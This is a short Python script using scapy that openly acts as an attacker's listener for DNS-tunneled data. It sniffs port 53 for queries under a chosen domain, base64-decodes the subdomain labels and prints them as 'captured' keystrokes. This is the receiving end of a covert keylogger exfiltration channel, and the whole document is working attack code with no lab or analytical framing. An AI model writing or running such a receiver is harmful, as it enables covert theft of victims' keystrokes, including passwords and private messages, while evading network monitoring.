from scapy.all import sniff, DNS, DNSQR
import base64

TARGET_DOMAIN = "test.google.com"

def decode_covert_traffic(packet):
    # 1. Check if it has a DNS layer and is a QUERY (qr == 0)
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        if packet.haslayer(DNSQR):
            query = packet[DNSQR].qname.decode('utf-8')
            
            if TARGET_DOMAIN in query:
                try:
                    encoded_data = query.split(f".{TARGET_DOMAIN}")[0]
                    missing_padding = len(encoded_data) % 4
                    if missing_padding:
                        encoded_data += '=' * (4 - missing_padding)
                    
                    decoded_keystrokes = base64.urlsafe_b64decode(encoded_data).decode('utf-8')
                    print(f"[+] CAPTURED: {decoded_keystrokes}  (Raw: {query})")
                    
                except Exception as e:
                    print(f"[-] Failed to decode: {query} ({e})")

print(f"[*] Attacker Listening for Covert DNS traffic to *.{TARGET_DOMAIN}...")
sniff(filter="udp port 53", prn=decode_covert_traffic, store=0)
